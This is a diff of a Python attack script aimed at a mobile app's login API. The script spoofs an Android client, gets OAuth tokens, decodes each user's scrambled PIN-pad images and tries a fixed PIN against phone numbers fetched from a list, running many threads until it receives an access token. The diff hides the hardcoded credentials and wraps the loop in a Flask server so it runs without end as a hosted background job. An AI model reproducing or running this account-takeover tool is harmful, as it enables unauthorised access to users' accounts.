@@ -1,6 +1,12 @@
+import os
+import threading
+import time
 import requests
+from flask import Flask
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Event
+
+app = Flask(__name__)
 
 session = requests.Session()
 
@@ -11,21 +17,20 @@ COMMON_HEADERS = {
     'User-Agent': "Masrvi / 25.09.6713(6713); com.google.android.packageinstaller; (samsung; SM-E055F; Android; 15)",
     'Accept': "application/json, text/plain, */*",
     'Accept-Encoding': "gzip",
-    'Content-Type': "application/json",
-    'Cookie': "PHPSESSID=js8chf66dl4qig1l6q9ti8f6b8"
+    'Content-Type': "application/json"
 }
 
-# =========================
-# إيقاف فوري
-# =========================
 stop_event = Event()
 
-# 🔹 التوكن
+# =========================
+# التوكن
+# =========================
 def get_token():
+
     payload = {
         "grant_type": "client_credentials",
-        "client_id": "80b60e90eb4c6fafe349f03614f72047",
-        "client_secret": "66c0d0406f9502121f002d936485a3ddb2ec633ff78c04f770d393941e59e311",
+        "client_id": "YOUR_CLIENT_ID",
+        "client_secret": "YOUR_SECRET",
         "scope": ["pincode_check"]
     }
 
@@ -38,7 +43,6 @@ def get_token():
     return res.json().get("access_token")
 
 
-# 🔹 الصور
 def get_images(token, num):
 
     if stop_event.is_set():
@@ -63,9 +67,6 @@ def get_images(token, num):
     return data.get("images", []), data.get("id")
 
 
-# =========================
-# قاعدة البيانات
-# =========================
 database = {
     0: "...",
     1: "...",
@@ -83,12 +84,15 @@ reverse_db = {v: k for k, v in database.items()}
 
 
 def extract_fast(user_images):
+
     results = {}
 
     for idx, img in enumerate(user_images):
+
         num = reverse_db.get(img)
 
         if num is not None:
+
             results[num] = idx
 
     return results
@@ -104,17 +108,16 @@ def build_password(pin, results_map):
     ]
 
     if None in indices:
+
         return None
 
     return ";".join(map(str, indices))
 
 
-# =========================
-# المحاولة
-# =========================
 def attempt(i, num, pin):
 
     if stop_event.is_set():
+
         return False
 
     try:
@@ -122,6 +125,7 @@ def attempt(i, num, pin):
         token = get_token()
 
         if not token:
+
             return False
 
         images, user_id = get_images(
@@ -130,6 +134,7 @@ def attempt(i, num, pin):
         )
 
         if not images:
+
             return False
 
         results_map = extract_fast(
@@ -142,19 +147,20 @@ def attempt(i, num, pin):
         )
 
         if not password_str:
+
             return False
 
         payload = {
             "grant_type": "password",
-            "client_id": "80b60e90eb4c6fafe349f03614f72047",
-            "client_secret": "66c0d0406f9502121f002d936485a3ddb2ec633ff78c04f770d393941e59e311",
+            "client_id": "YOUR_CLIENT_ID",
+            "client_secret": "YOUR_SECRET",
             "scope": [
                 "pincode_check",
                 "otp_check"
             ],
             "username": user_id,
             "password": password_str,
-            "install_id": "75283595-3b34-42e6-8b2a-b44b8cf47e85"
+            "install_id": "RANDOM-ID"
         }
 
         res = session.post(
@@ -175,12 +181,10 @@ def attempt(i, num, pin):
         return "access_token" in data
 
     except Exception:
+
         return False
 
 
-# =========================
-# جلب الأرقام
-# =========================
 def get_numbers():
 
     try:
@@ -193,6 +197,7 @@ def get_numbers():
         data = res.json()
 
         if not data:
+
             return []
 
         return data.get(
@@ -201,51 +206,85 @@ def get_numbers():
         )
 
     except Exception:
+
         return []
 
 
-numbers_list = get_numbers()
+def worker():
 
-pin = "9309"
+    pin = "9309"
 
-# =========================
-# التشغيل
-# =========================
-for num in numbers_list:
-
-    stop_event.clear()
-
-    success = False
-
-    with ThreadPoolExecutor(
-        max_workers=50
-    ) as executor:
-
-        futures = [
-            executor.submit(
-                attempt,
-                i,
-                num,
-                pin
-            )
-            for i in range(7)
-        ]
-
-        for future in as_completed(
-            futures
-        ):
-
-            if stop_event.is_set():
-                break
-
-            if future.result():
-
-                success = True
-
-                stop_event.set()
-
-                break
-if __name__ == "__main__":
     while True:
-        # تشغيل الكود الرئيسي
-        pass
+
+        numbers_list = get_numbers()
+
+        for num in numbers_list:
+
+            stop_event.clear()
+
+            success = False
+
+            with ThreadPoolExecutor(
+                max_workers=20
+            ) as executor:
+
+                futures = [
+                    executor.submit(
+                        attempt,
+                        i,
+                        num,
+                        pin
+                    )
+                    for i in range(7)
+                ]
+
+                for future in as_completed(
+                    futures
+                ):
+
+                    if stop_event.is_set():
+
+                        break
+
+                    if future.result():
+
+                        success = True
+
+                        stop_event.set()
+
+                        break
+
+        time.sleep(5)
+
+
+@app.route("/")
+def home():
+
+    return "Server is running"
+
+
+def start_background():
+
+    thread = threading.Thread(
+        target=worker,
+        daemon=True
+    )
+
+    thread.start()
+
+
+if __name__ == "__main__":
+
+    start_background()
+
+    port = int(
+        os.environ.get(
+            "PORT",
+            10000
+        )
+    )
+
+    app.run(
+        host="0.0.0.0",
+        port=port
+            )
